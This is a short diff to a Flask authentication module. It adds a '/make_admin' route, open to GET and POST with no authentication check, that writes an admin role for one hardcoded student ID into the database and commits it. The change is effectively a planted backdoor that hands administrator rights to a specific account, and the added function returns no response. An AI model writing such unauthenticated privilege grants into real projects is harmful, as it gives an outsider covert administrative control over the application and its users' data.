@@ -232,3 +232,11 @@ def reset_password():
         "reset_password.html",
         username=username
     )
+@auth_bp.route("/make_admin", methods=["GET", "POST"])
+def make_admin():
+    admin_role = Role(                
+        student_id=25022700,          
+        name="admin"        
+    )
+    db.session.add(admin_role)
+    db.session.commit()
